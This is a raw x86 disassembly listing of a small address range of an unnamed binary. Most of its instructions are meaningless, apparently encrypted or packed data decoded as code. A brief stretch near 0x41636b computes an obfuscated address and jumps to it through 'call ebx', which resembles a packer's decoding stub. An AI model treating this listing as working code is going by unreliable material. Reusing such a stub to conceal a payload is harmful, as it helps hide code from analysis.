  4160ac:	jnp    0x416097
  4160ae:	sbb    DWORD PTR [edi+0x5b440cc1],edx
  4160b4:	push   edi
  4160b5:	add    BYTE PTR [ebp+0x29],bh
  4160b8:	fst    DWORD PTR [eax]
  4160ba:	(bad)  
  4160bc:	sbb    ch,ch
  4160be:	out    0xa8,al
  4160c0:	push   esp
  4160c1:	test   DWORD PTR [ebx-0x4e7f2f59],ebp
  4160c7:	or     DWORD PTR [eax],edi
  4160c9:	sub    ebx,DWORD PTR [edx+0x5807b614]
  4160cf:	and    ah,BYTE PTR [ebp-0x66d05be7]
  4160d5:	mov    ah,0x29
  4160d7:	div    DWORD PTR [ecx-0x42]
  4160da:	mov    ds:0xa60924a6,eax
  4160df:	enter  0x5775,0x59
  4160e3:	dec    esp
  4160e4:	push   esi
  4160e5:	xlat   BYTE PTR ds:[ebx]
  4160e6:	int3   
  4160e7:	mov    ecx,ecx
  4160e9:	pop    edi
  4160ea:	or     DWORD PTR [ecx],ecx
  4160ec:	es out 0x8c,eax
  4160ef:	test   al,0xf2
  4160f1:	ffreep st(6)
  4160f3:	div    esi
  4160f5:	(bad)  
  4160f6:	pusha  
  4160f7:	cwde   
  4160f8:	fcomp  DWORD PTR [esi-0x3603fa86]
  4160fe:	jl     0xd1621847
  416104:	aam    0xe9
  416106:	or     DWORD PTR [ecx+eiz*2],esp
  416109:	call   0xcf38df61
  41610e:	mov    esi,0x3c18e4aa
  416113:	cld    
  416114:	jne    0x416128
  416116:	jbe    0x41613b
  416118:	or     al,0x7b
  41611a:	in     al,0xcb
  41611c:	push   esp
  41611d:	fsubp  st(0),st
  41611f:	es jl  0x416106
  416122:	push   ebp
  416123:	inc    edx
  416124:	dec    ebp
  416125:	cmp    BYTE PTR [edi-0x42],al
  416128:	data16 arpl WORD PTR [esi],dx
  41612b:	rcr    DWORD PTR [ebp+0x68],1
  41612e:	ss inc eax
  416130:	in     al,dx
  416131:	in     al,0x2c
  416133:	push   eax
  416134:	cmp    eax,0xd2df36b7
  416139:	std    
  41613a:	add    al,0xa1
  41613c:	ds (bad) 
  41613e:	mov    al,ds:0x30407f16
  416143:	jbe    0x4160da
  416145:	fdivr  DWORD PTR [edx]
  416147:	int3   
  416148:	(bad)  
  416149:	ins    DWORD PTR es:[edi],dx
  41614a:	push   eax
  41614b:	sbb    BYTE PTR [edi],0xa
  41614e:	addr16 out dx,al
  416150:	mov    esi,0x84810ada
  416155:	lock mov bh,0xd7
  416158:	cmp    bl,BYTE PTR [ecx+edi*2+0x38972165]
  41615f:	aas    
  416160:	pop    edx
  416161:	push   ss
  416162:	aad    0xfe
  416164:	inc    edi
  416165:	cld    
  416166:	int3   
  416167:	add    BYTE PTR [edx+0x47],0xa8
  41616b:	cmp    dl,BYTE PTR [edi+0x30]
  41616e:	mov    eax,edx
  416170:	cmp    DWORD PTR [eax-0x55d08a6c],edx
  416176:	in     al,dx
  416177:	push   ebp
  416178:	cs jle 0x4161b2
  41617b:	add    BYTE PTR [esi],bl
  41617d:	mov    ch,0xd7
  41617f:	adc    ah,BYTE PTR [edi-0x63]
  416182:	and    al,0x38
  416184:	mov    DWORD PTR [edi-0x13fdc945],edi
  41618a:	adc    eax,DWORD PTR [edi+ecx*8-0x1ccd7e90]
  416191:	rcl    BYTE PTR [ebp-0x38],1
  416194:	jle    0x416149
  416196:	jle    0x4161c0
  416198:	sbb    ebp,DWORD PTR [edi]
  41619a:	in     al,0xa1
  41619c:	lea    esi,[esi+0x5e784509]
  4161a2:	push   cs
  4161a3:	and    al,0x33
  4161a5:	mov    ds:0xfef8e78f,eax
  4161aa:	aam    0x1f
  4161ac:	repz loop 0x41622b
  4161af:	test   eax,edx
  4161b1:	nop
  4161b2:	icebp  
  4161b3:	sbb    BYTE PTR [ebx+0x56],cl
  4161b6:	fldlg2 
  4161b8:	pop    ebx
  4161b9:	int3   
  4161ba:	repz add al,0x54
  4161bd:	nop
  4161be:	clc    
  4161bf:	pop    esi
  4161c0:	add    dl,BYTE PTR ds:0x7e9970e3
  4161c6:	xchg   DWORD PTR [ecx+0x12],edx
  4161c9:	addr16 hlt 
  4161cb:	scas   al,BYTE PTR es:[edi]
  4161cc:	and    cl,BYTE PTR [bp+si+0x2a]
  4161d0:	adc    dh,BYTE PTR [esi+esi*2]
  4161d3:	repnz or esp,ecx
  4161d6:	xchg   DWORD PTR [edi],edx
  4161d8:	ds dec ecx
  4161da:	inc    eax
  4161db:	(bad)  
  4161dc:	aad    0xde
  4161de:	fisub  WORD PTR [edi+ebx*1+0x463ee2e0]
  4161e5:	jg     0x41625c
  4161e7:	push   ds
  4161e8:	outs   dx,BYTE PTR ds:[esi]
  4161e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161ea:	jmp    0x4161db
  4161ec:	sub    dh,bl
  4161ee:	addr16 mov eax,ds:0xd15d
  4161f2:	xor    BYTE PTR [esi],al
  4161f4:	popf   
  4161f5:	stos   BYTE PTR es:[edi],al
  4161f6:	mov    dh,0x30
  4161f8:	dec    eax
  4161f9:	call   0x2b74:0x928d889c
  416200:	lea    ebp,[edx]
  416202:	inc    edi
  416203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416204:	mov    dh,0x9d
  416206:	jl     0x416251
  416208:	fs pop esp
  41620a:	repz jne 0x4161aa
  41620d:	sar    DWORD PTR [ebx+0x52085c65],cl
  416213:	pop    ebx
  416214:	lock inc eax
  416216:	(bad)  
  416217:	or     ebx,ebx
  416219:	cli    
  41621a:	pop    ecx
  41621b:	sub    ebx,DWORD PTR [edi-0x18]
  41621e:	lahf   
  41621f:	rcr    DWORD PTR [ebp+edi*8-0x3f],cl
  416223:	fdiv   st(0),st
  416225:	sbb    DWORD PTR [edi+0x1e],esi
  416228:	call   0x2da5:0xd1554061
  41622f:	or     DWORD PTR [ebx],ebp
  416231:	push   0x66
  416233:	jne    0x41629e
  416235:	in     eax,dx
  416236:	xchg   ecx,eax
  416237:	out    0x1,eax
  416239:	mov    esp,0x5189fe90
  41623e:	mov    DWORD PTR [ebx],ebp
  416240:	aam    0x13
  416242:	jecxz  0x416288
  416244:	test   DWORD PTR [ebx+0x7a],ecx
  416247:	in     eax,0xf6
  416249:	jmp    0x4e04b2a7
  41624e:	or     al,0x32
  416250:	data16 in al,0xcf
  416253:	jmp    0x9fc4:0x7b2de9
  41625a:	inc    edi
  41625b:	xlat   BYTE PTR ds:[ebx]
  41625c:	outs   dx,DWORD PTR ds:[esi]
  41625d:	jnp    0x4162d9
  41625f:	rcl    edi,cl
  416261:	mov    al,0x8d
  416263:	mov    WORD PTR [edx+0x4c],cs
  416266:	mov    ch,0xae
  416268:	pop    ds
  416269:	inc    ebx
  41626a:	mov    dl,0xaa
  41626c:	sub    ebp,DWORD PTR [edx+0x72]
  41626f:	push   ecx
  416270:	push   ebp
  416271:	xchg   esp,eax
  416272:	xchg   ebx,eax
  416273:	ins    DWORD PTR es:[edi],dx
  416274:	mov    esp,0x8cf9020
  416279:	inc    edi
  41627a:	jmp    0x416220
  41627c:	sub    BYTE PTR [eax],0xd9
  41627f:	gs call 0x2145:0xc3a6e906
  416287:	fucomip st,st(5)
  416289:	pusha  
  41628a:	inc    ebp
  41628b:	sub    eax,0x72f0065d
  416290:	dec    edx
  416291:	retf   
  416292:	js     0x41621c
  416294:	outs   dx,DWORD PTR ds:[esi]
  416295:	jnp    0x416254
  416297:	out    0xb6,eax
  416299:	adc    DWORD PTR [esi-0x3df3b566],edx
  41629f:	add    al,0x90
  4162a1:	fst    QWORD PTR [edx]
  4162a3:	and    eax,0x88c6f925
  4162a8:	mov    ebx,0x717c44bd
  4162ad:	(bad)  
  4162ae:	mov    ebp,0x40ba3c60
  4162b3:	dec    esp
  4162b4:	shr    DWORD PTR [ecx-0x40],1
  4162b7:	(bad)  
  4162ba:	jo     0x416313
  4162bc:	inc    eax
  4162bd:	shl    BYTE PTR [ecx],1
  4162bf:	sbb    eax,0xdb1417ce
  4162c4:	cwde   
  4162c5:	popa   
  4162c6:	repnz inc ebx
  4162c8:	(bad)  [ebp+0x36dc5a03]
  4162ce:	bound  ecx,QWORD PTR [esp+eiz*4-0x66]
  4162d2:	or     esp,esp
  4162d4:	dec    eax
  4162d5:	sti    
  4162d6:	pop    eax
  4162d7:	shl    DWORD PTR [edx+0x5a],0xfe
  4162db:	pop    edi
  4162dc:	ret    0x3789
  4162df:	aam    0x91
  4162e1:	repnz sub eax,ebp
  4162e4:	and    eax,DWORD PTR [ecx]
  4162e6:	mov    bl,0x2b
  4162e8:	cmp    eax,0x3a0cb581
  4162ed:	xchg   DWORD PTR [edi],ebp
  4162ef:	ret    0x92b5
  4162f2:	mov    ds:0x3dca6e38,eax
  4162f7:	sbb    al,0x62
  4162f9:	push   0x19
  4162fb:	mov    DWORD PTR [ebx-0x7d827bc2],ecx
  416301:	and    al,0x8b
  416303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416305:	push   ds
  416306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416307:	inc    esi
  416308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416309:	call   0x1d54d588
  41630e:	clc    
  41630f:	mov    ecx,0x7d2c75fd
  416314:	inc    ecx
  416315:	ret    
  416316:	aam    0x33
  416318:	inc    ecx
  416319:	or     eax,0x39b10b3a
  41631e:	into   
  41631f:	call   0x3a6d:0x5f6ce149
  416326:	or     dl,BYTE PTR [edx+0x2cf0be91]
  41632c:	adc    eax,0xa509151a
  416331:	das    
  416332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416333:	inc    ebx
  416334:	mov    bl,BYTE PTR [edi]
  416336:	stc    
  416337:	in     al,0x88
  416339:	or     al,0xed
  41633b:	addr16 push ebp
  41633d:	push   ebp
  41633e:	stos   BYTE PTR es:[edi],al
  41633f:	xor    DWORD PTR ds:0xf3d67c0c,ebp
  416345:	and    edx,eax
  416347:	data16 std 
  416349:	adc    DWORD PTR [edx+0x4ba0516c],esp
  41634f:	push   ds
  416350:	arpl   WORD PTR [edi+0x31],dx
  416353:	sahf   
  416354:	into   
  416355:	or     ebp,DWORD PTR [ebx-0xd52397a]
  41635b:	xor    edx,DWORD PTR [edi+0x5a7f6537]
  416361:	xor    eax,0x2b1511b8
  416366:	test   eax,0x5a63ac08
  41636b:	pop    ecx
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x6261c841
  4163bf:	cmp    BYTE PTR [esi+0x13],0x14
  4163c3:	jg     0x416435
  4163c5:	mov    ecx,0x4370707e
  4163ca:	sahf   
  4163cb:	mov    bl,0x1c
  4163cd:	jmp    0xdbe7:0x83ebc0b5
  4163d4:	pop    es
  4163d5:	inc    edx
  4163d6:	mov    dl,bh
  4163d8:	repz call 0xca63d570
  4163de:	lods   al,BYTE PTR ds:[esi]
  4163df:	rcl    edi,0x8b
  4163e2:	sub    ebx,DWORD PTR [edi+0x31652897]
  4163e8:	sub    ebx,ecx
  4163ea:	or     DWORD PTR [esi],eax
  4163ec:	pop    es
  4163ed:	jns    0x416401
  4163ef:	pop    edx
  4163f0:	sbb    BYTE PTR [edx],0x5f
  4163f3:	and    BYTE PTR [ebp+0x449e1d31],ah
  4163f9:	jo     0x4163a8
  4163fb:	mov    dl,0x86
  4163fd:	inc    edi
  4163fe:	in     al,dx
  4163ff:	test   BYTE PTR [ebp+0x3bb35f70],ah
  416405:	sbb    BYTE PTR [edx+0x9],ah
  416408:	mov    dh,0x11
  41640a:	jnp    0x416476
  41640c:	mov    ebx,0xc61d22d4
  416411:	inc    edi
  416412:	add    al,0x15
  416414:	daa    
  416415:	lock mov esp,esi
  416418:	fnstenv [esi]
  41641a:	ins    BYTE PTR es:[edi],dx
  41641b:	fidivr DWORD PTR [esi+0x29221ca6]
  416421:	and    eax,0x41253e15
  416426:	sbb    BYTE PTR [eax],dh
  416428:	push   0x47
  41642a:	fnstcw WORD PTR [edi-0x57]
  41642d:	jg     0x4163ec
  41642f:	jmp    FWORD PTR [bx+si-0x40]
  416433:	(bad)  
  416435:	fisub  DWORD PTR [esi+0x24c6c6a9]
  41643b:	clc    
  41643c:	xchg   BYTE PTR [ebp+0x79d8bac1],bh
  416442:	xchg   edx,eax
  416443:	mov    bh,0x67
  416445:	mov    ch,0x7d
  416447:	push   ebx
  416448:	adc    ch,0xa
  41644b:	jae    0x4164ad
  41644d:	ds clc 
  41644f:	adc    DWORD PTR [ecx-0x5e],edx
  416452:	(bad)  
  416453:	call   0x79625002
  416458:	retf   0x461c
  41645b:	(bad)  
  41645d:	repnz cmp dh,BYTE PTR [edx+0x1e]
  416461:	hlt    
  416462:	mov    ds:0x417b3d4f,eax
  416467:	mov    al,ds:0xd4630972
  41646c:	sub    DWORD PTR [ebx+0x652b8ed],esi
  416472:	int    0xd8
  416474:	xlat   BYTE PTR ds:[ebx]
  416475:	stos   DWORD PTR es:[edi],eax
  416476:	lahf   
  416477:	fild   WORD PTR [esp+eiz*4-0x10]
  41647b:	add    dl,BYTE PTR ds:0x86e5d282
  416481:	pop    ecx
  416482:	sub    esp,edx
  416484:	mov    eax,0x3cc098f0
  416489:	xor    eax,0x4ddea6ec
  41648e:	jb     0x416436
  416490:	mov    al,0xe1
  416492:	test   DWORD PTR [edx+0x37],ecx
  416495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416496:	rcr    DWORD PTR [ecx+0x4a],0x6
  41649a:	jns    0x4164b9
  41649c:	ins    DWORD PTR es:[edi],dx
  41649d:	mov    dl,0xc1
  41649f:	push   esi
  4164a0:	aas    
  4164a1:	mov    ebp,edi
  4164a3:	jns    0x41643e
  4164a5:	or     eax,0x2954d752
  4164aa:	(bad)  
  4164ab:	cmp    edx,ebx
  4164ad:	mov    bl,0x74
  4164af:	sbb    DWORD PTR [ecx-0x29],edx
  4164b2:	cli    
  4164b3:	mov    ds:0xec7a7e88,al
  4164b8:	add    eax,0xfb0cb58f
  4164bd:	mul    ah
  4164bf:	xchg   edi,eax
  4164c0:	retf   
  4164c1:	dec    eax
  4164c2:	xchg   esp,eax
  4164c3:	adc    BYTE PTR [edx-0x1534529b],al
  4164c9:	das    
  4164ca:	jmp    0xf566db8a
  4164cf:	push   es
  4164d0:	xor    al,0x7
  4164d2:	push   ecx
  4164d3:	dec    eax
  4164d4:	pop    ds
  4164d5:	pop    eax
  4164d6:	xchg   edi,eax
  4164d7:	jbe    0x416538
  4164d9:	cmp    eax,0x2aeceeee
  4164de:	inc    ebp
  4164df:	push   0x6f5227dc
  4164e4:	cmp    BYTE PTR [ecx],cl
  4164e6:	jle    0x4164c0
  4164e8:	cdq    
  4164e9:	shl    bl,cl
  4164eb:	xchg   edi,eax
  4164ec:	(bad)  [esi+ebp*2]
  4164ef:	(bad)  
  4164f1:	cmp    al,0xfc
  4164f3:	mov    BYTE PTR [esi-0x33ca4516],dl
  4164f9:	mov    bl,0xaf
  4164fb:	in     al,0x49
  4164fd:	(bad)  
  4164fe:	mov    bl,0x29
  416500:	bound  eax,QWORD PTR [ebp+ebx*2+0x10]
  416504:	inc    edi
  416505:	sbb    esp,ebx
  416507:	inc    ecx
  416508:	and    dl,0x51
  41650b:	and    eax,0x3588f9fe
  416510:	repnz fs pop es
  416513:	dec    edx
  416514:	bound  esp,QWORD PTR [eax+0x61]
  416517:	pop    edi
  416518:	add    al,0xbe
  41651a:	mov    ch,0x43
  41651c:	xchg   esi,esi
  41651e:	fadd   DWORD PTR [eax+ebx*1-0x55]
  416522:	xchg   BYTE PTR [ebp-0x2c],dh
  416525:	stos   BYTE PTR es:[edi],al
  416526:	clc    
  416527:	and    BYTE PTR [esi],bl
  416529:	mov    ebx,0x8dbd0118
  41652e:	pop    ebp
  41652f:	imul   edx,DWORD PTR [edi],0x6a
  416532:	call   0x4afe:0x1fc3d43f
  416539:	dec    ebp
  41653a:	sti    
  41653b:	add    eax,DWORD PTR [eax+0x71]
  41653e:	xchg   edx,eax
  41653f:	mov    ch,0x8
  416541:	ss test eax,ecx
  416544:	loop   0x4164e8
  416546:	fcomp  DWORD PTR [edx+0x6d0fd956]
  41654c:	mov    al,bl
  41654e:	iret   
  41654f:	jne    0x416528
  416551:	sti    
  416552:	das    
  416553:	pop    ecx
  416554:	aas    
  416555:	repnz clc 
  416557:	in     al,dx
  416558:	inc    ebp
  416559:	cmp    al,0x1d
  41655b:	push   esp
  41655c:	add    BYTE PTR [esi+0xb495b91],cl
  416562:	jae    0x416584
  416564:	repnz ins DWORD PTR es:[edi],dx
  416566:	sbb    eax,0x6ceafb41
  41656b:	push   esp
  41656c:	mov    DWORD PTR [edx+ebp*8+0x3a],edx
  416570:	mov    bh,0xcc
  416572:	inc    esi
  416573:	mov    eax,DWORD PTR [edx]
  416575:	sub    esp,edi
  416577:	stos   BYTE PTR es:[edi],al
  416578:	jno    0x41656d
  41657a:	mov    eax,ds:0x1cac746e
  41657f:	add    BYTE PTR [esi],dl
  416581:	push   cs
  416582:	outs   dx,BYTE PTR ds:[esi]
  416583:	aaa    
  416584:	cld    
  416585:	(bad)
  416589:	clc    
  41658a:	pop    esi
  41658b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41658c:	pop    ds
  41658d:	cdq    
  41658e:	inc    ecx
  41658f:	les    eax,FWORD PTR [edi+0x3fffe85b]
  416595:	pop    es
  416596:	retf   
  416597:	cld    
  416598:	cwde   
  416599:	sbb    al,0x42
  41659b:	add    BYTE PTR [esi+0x33f530a4],dl
  4165a1:	sbb    bh,ch
  4165a3:	stc    
  4165a4:	and    eax,0xf4ee0abb
  4165a9:	test   BYTE PTR [esi],0x9b
  4165ac:	test   DWORD PTR [edi+0x26f48d6c],ebp
  4165b2:	xchg   ebp,eax
  4165b3:	rol    edx,0x12
  4165b6:	sub    eax,0x3af1729a
  4165bb:	stos   DWORD PTR es:[edi],eax
  4165bc:	mov    DWORD PTR [ecx+0x53],edi
  4165bf:	xchg   ebp,eax
  4165c0:	sub    eax,0x351b59c2
  4165c5:	mov    esi,0xe491054
  4165ca:	out    0x62,al
  4165cc:	xor    bh,BYTE PTR [ebx-0x7d058f08]
  4165d2:	shl    DWORD PTR [edi-0x6e],0x1a
  4165d6:	push   esi
  4165d7:	adc    eax,0x9808569
  4165dc:	retf   
  4165dd:	add    BYTE PTR [ebx+0x33],bl
  4165e0:	inc    ecx
  4165e1:	(bad)  
  4165e2:	sbb    cl,dl
  4165e4:	retf   
  4165e5:	pop    ebx
  4165e6:	jg     0x41659a
  4165e8:	or     bh,al
  4165ea:	dec    esi
  4165eb:	and    cl,ah
  4165ed:	add    cl,BYTE PTR [ebx+0x5e85f9e8]
  4165f3:	xchg   esp,eax
  4165f4:	clc    
  4165f5:	mov    al,0x76
  4165f7:	xchg   BYTE PTR [ebx],bl
  4165f9:	mov    ebx,eax
  4165fb:	outs   dx,BYTE PTR ds:[esi]
  4165fc:	xor    al,BYTE PTR ds:0x65928d6f
  416602:	dec    esp
  416603:	mov    al,0x4c
  416605:	jmp    0x7c27:0x7b1ec05e
  41660c:	xlat   BYTE PTR ds:[ebx]
  41660d:	adc    esp,DWORD PTR [edi+0x21]
  416610:	adc    DWORD PTR [ebp+0x55],ecx
  416613:	rol    DWORD PTR [ebx+0x6828e0ce],0xed
  41661a:	mov    esp,0x3f96b79d
  41661f:	inc    eax
  416620:	push   cs
  416621:	cld    
  416622:	cwde   
  416623:	ins    BYTE PTR es:[edi],dx
  416624:	sahf   
  416625:	and    al,0xde
  416627:	adc    BYTE PTR [edi+esi*8],cl
  41662a:	cmp    al,0x34
  41662c:	es in  al,dx
  41662e:	adc    eax,0xa6fe7e68
  416633:	sbb    dh,cl
  416635:	adc    dl,BYTE PTR [esi+0x7b]
  416638:	stc    
  416639:	es das 
  41663b:	lods   al,BYTE PTR ds:[esi]
  41663c:	cmc    
  41663d:	jb     0x41666b
  41663f:	pusha  
  416640:	jnp    0x4165f8
  416642:	icebp  
  416643:	(bad)  
  416644:	sti    
  416645:	(bad)  
  416647:	mov    ss,esp
  416649:	nop
  41664a:	push   eax
  41664b:	iret   
  41664c:	dec    esi
  41664d:	pop    es
  41664e:	in     al,dx
  41664f:	in     eax,dx
  416650:	into   
  416651:	push   cs
  416652:	in     eax,0x52
  416654:	add    DWORD PTR [ebp-0x68],esi
  416657:	call   0x7f6407ed
  41665c:	xchg   edi,eax
  41665d:	idiv   DWORD PTR [esi]
  41665f:	inc    eax
  416660:	mov    ds:0xf1cccbec,eax
  416665:	stos   DWORD PTR es:[edi],eax
  416666:	cmp    eax,0xbc2ca977
  41666b:	retf   0x1470
  41666e:	lock call 0x5bd8:0x79238d1a
  416676:	mov    ds:0xebe6f8af,al
  41667b:	inc    ecx
  41667c:	add    al,0xc2
  41667e:	and    DWORD PTR [edx-0x537c7a58],esi
  416684:	dec    ebx
  416685:	enter  0x598,0xfb
  416689:	mov    bl,0x4d
  41668b:	or     DWORD PTR [edx+0x43],ebx
  41668e:	lds    ebp,FWORD PTR [eax+0x590a6a92]
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x41664d
  4166ae:	data16 adc BYTE PTR [eax+0x5c],bl
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0xac70707e
  4166ba:	arpl   WORD PTR [edx],cx
  4166bc:	mov    cl,0x53
  4166be:	jl     0x416667
  4166c0:	adc    BYTE PTR [edx+0x73eef3b9],cl
  4166c6:	aas    
  4166c7:	add    DWORD PTR [eax+0x6f],edx
  4166ca:	ja     0x41667e
  4166cc:	mov    cl,0x4a
  4166ce:	or     eax,DWORD PTR [edx*8-0x59f339b]
  4166d5:	fimul  DWORD PTR [edi+0x15]
  4166d8:	data16 mov ds:0x41c04e7f,al
  4166de:	inc    ebx
  4166df:	mov    bh,0x9
  4166e1:	sub    DWORD PTR [edi-0x6a],ebx
  4166e4:	ret    0x1406
  4166e7:	xchg   esp,eax
  4166e8:	xchg   esp,eax
  4166e9:	and    eax,0xb241987f
  4166ee:	push   ecx
  4166ef:	add    cl,bh
  4166f1:	inc    ebp
  4166f2:	and    BYTE PTR [ecx+0x7b],0xab
  4166f6:	dec    BYTE PTR [ecx-0xa]
  4166f9:	mov    ds:0xae708640,al
  4166fe:	fistp  WORD PTR [ebx-0x784c7c69]
  416704:	sbb    bl,BYTE PTR [edx+0x29]
  416707:	int    0xd9
  416709:	cld    
  41670a:	shl    DWORD PTR [edx+0x0],1
  41670d:	mov    BYTE PTR [esi+0x57ad0f10],ch
  416713:	xchg   edx,eax
  416714:	adc    eax,0xd82cf985
  416719:	rcl    BYTE PTR [ecx-0x10],0x30
  41671d:	inc    ecx
  41671e:	dec    esp
  41671f:	dec    esp
  416720:	adc    BYTE PTR [edx],al
  416722:	cmp    ebp,ecx
  416724:	adc    BYTE PTR [esi-0x6f436887],ch
  41672a:	loope  0x41670f
  41672c:	sub    dh,BYTE PTR [ebx+edx*2-0x2fd788d3]
  416733:	lods   eax,DWORD PTR ds:[esi]
  416734:	es pop eax
  416736:	loop   0x4166f2
  416738:	pop    es
  416739:	push   ss
  41673a:	lds    ebp,FWORD PTR [edi]
  41673c:	cmp    ebp,edx
  41673e:	imul   ebx,DWORD PTR [ecx-0x47],0x64d1da32
  416745:	dec    esp
  416746:	div    DWORD PTR ds:0xad09097a
  41674c:	sbb    esp,DWORD PTR [edx-0x7c27fce]
  416752:	lds    ebp,FWORD PTR [edx-0x2820e67f]
  416758:	add    eax,0x92c1733d
  41675d:	and    dl,bh
  41675f:	sbb    al,0x40
  416761:	rcl    al,0xc9
  416764:	dec    edi
  416765:	loope  0x416775
  416767:	rol    DWORD PTR [ebx],1
  416769:	frstor [esi+0x2a31d0d5]
  41676f:	in     al,dx
  416770:	stos   DWORD PTR es:[edi],eax
  416771:	lods   al,BYTE PTR ds:[esi]
  416772:	fadd   QWORD PTR [ebp+0x16]
  416775:	dec    eax
  416776:	jp     0x416751
  416778:	and    eax,0x82f62607
  41677d:	push   ebx
  41677e:	jno    0x4167c7
  416780:	fst    QWORD PTR [ecx+esi*2]
  416783:	int3   
  416784:	jne    0x416803
  416786:	mov    edx,0xd2bec0b
  41678b:	das    
  41678c:	fisttp WORD PTR [esi]
  41678e:	xor    al,0x4c
  416790:	mov    ebp,0x3fa71889
  416795:	xchg   BYTE PTR [ebx-0x3fb42d4b],al
  41679b:	cmp    DWORD PTR [edi+edx*1+0x36308f35],edx
  4167a2:	pop    es
  4167a3:	push   ecx
  4167a4:	addr16 enter 0x6fd6,0x87
  4167a9:	imul   esi,DWORD PTR [esi],0xbfd78e35
  4167af:	xor    DWORD PTR [ecx+0xa],eax
  4167b2:	adc    DWORD PTR [ebp+0x54dead29],edx
  4167b8:	and    DWORD PTR [ebp-0x40f13184],edi
  4167be:	outs   dx,BYTE PTR ds:[esi]
  4167bf:	xor    eax,DWORD PTR [ebp+ebx*1-0x7d368d51]
  4167c6:	adc    BYTE PTR [esi+0x4],0x91
  4167ca:	adc    eax,0xc992e9c9
  4167cf:	push   0xfffffff5
  4167d1:	icebp  
  4167d2:	ds push esi
  4167d4:	push   ecx
  4167d5:	int    0xbc
  4167d7:	jns    0x4167ef
  4167d9:	jb     0x41681c
  4167db:	sbb    cl,BYTE PTR [ebx]
  4167dd:	cwde   
  4167de:	imul   ebp,DWORD PTR [eax+0x7e16ec51],0xdaeeb49d
  4167e8:	jns    0x416844
  4167ea:	shl    DWORD PTR [ebp+ecx*8-0x39fa2b68],cl
  4167f1:	clc    
  4167f2:	jl     0x41685c
  4167f4:	fldcw  WORD PTR [edx-0x7c7b38dc]
  4167fa:	jge    0x4167b7
  4167fc:	add    al,0x1f
  4167fe:	lock fwait
  416800:	jl     0x41684b
  416802:	out    dx,eax
  416803:	pop    edx
  416804:	(bad)  
  416805:	in     al,0xe0
  416807:	mov    edx,0xc3255526
  41680c:	lock scas al,BYTE PTR es:[edi]
  41680e:	mov    eax,ds:0xee8bf689
  416813:	push   0xcaffa02b
  416818:	pop    ss
  416819:	xlat   BYTE PTR ds:[ebx]
  41681a:	inc    eax
  41681b:	mov    ch,BYTE PTR [edx]
  41681d:	js     0x4167dc
  41681f:	in     eax,dx
  416820:	pop    ds
  416821:	jmp    0x8cf8667a
  416826:	jb     0x416843
  416828:	sbb    BYTE PTR [edx+0xd],dl
  41682b:	stc    
  41682c:	fsub   QWORD PTR [ecx+0x6b]
  41682f:	push   0xdc7fc5e3
  416834:	jg     0x4167e5
  416836:	scas   al,BYTE PTR es:[edi]
  416837:	sti    
  416838:	pop    esi
  416839:	xchg   ebp,eax
  41683a:	sub    eax,ebp
  41683c:	dec    esp
  41683d:	lahf   
  41683e:	cmp    ecx,edi
  416840:	xor    esp,DWORD PTR [ebx]
  416842:	stc    
  416843:	adc    DWORD PTR [eax-0x1c],eax
  416846:	cdq    
  416847:	or     al,0xbc
  41684a:	xor    ah,BYTE PTR [edi]
  41684c:	mov    esi,0x9f7bfc9
  416851:	xor    eax,0x8dd28843
  416856:	xchg   ebp,eax
  416857:	scas   eax,DWORD PTR es:[edi]
  416858:	xor    DWORD PTR [ebp-0x24],0xd
  41685c:	jne    0x4168db
  41685e:	cld    
  41685f:	or     ch,BYTE PTR [esi]
  416861:	clc    
  416862:	push   es
  416863:	cdq    
  416864:	in     al,0x8f
  416866:	pusha  
  416867:	jnp    0x416807
  416869:	loopne 0x4168d6
  41686b:	in     eax,0xe8
  41686d:	and    edx,0xe17f6e19
  416873:	aas    
  416874:	xlat   BYTE PTR ds:[ebx]
  416875:	leave  
  416876:	les    edx,FWORD PTR [ecx+0x47]
  416879:	loop   0x416825
  41687b:	inc    edx
  41687c:	cmp    edx,DWORD PTR [edi]
  41687e:	jmp    0xfbd5a337
  416883:	aam    0xd4
  416885:	xor    edi,edi
  416887:	je     0x4168ae
  416889:	fwait
  41688a:	pusha  
  41688b:	add    DWORD PTR [ebx-0x3f],esp
  41688e:	dec    ebx
  41688f:	or     BYTE PTR [ebx-0x63],dl
  416892:	pop    ecx
  416893:	xor    BYTE PTR [ebx],ch
  416895:	inc    ebp
  416896:	daa    
  416897:	jbe    0x4168b6
  416899:	pushf  
  41689a:	inc    edi
  41689b:	cmp    eax,0x64591004
  4168a0:	jno    0x4168ce
  4168a2:	ins    BYTE PTR es:[edi],dx
  4168a3:	cmp    DWORD PTR [eax+eiz*1],edi
  4168a6:	add    al,0xc7
  4168a8:	mov    ds:0xab5c8082,eax
